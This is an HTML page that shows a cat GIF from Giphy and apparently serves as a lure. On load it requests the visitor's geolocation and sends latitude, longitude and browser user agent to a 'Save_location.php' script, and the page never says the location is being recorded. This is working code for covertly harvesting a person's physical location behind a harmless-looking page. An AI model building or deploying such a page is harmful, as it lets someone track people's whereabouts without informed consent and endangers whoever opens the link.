<!DOCTYPE html>
<html>
<body onload="getLocation()">
    <iframe src="https://giphy.com/embed/JfLdIahamXQI0" width="1500" height="600" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/cat-fail-JfLdIahamXQI0"></a></p>
<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  const xhttp = new XMLHttpRequest ();
  xhttp.open("GET", "Save_location.php?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + "&uswe_agent: "+ navigator.userAgent );
   xhttp.send();

}
</script>

</body>
</html>
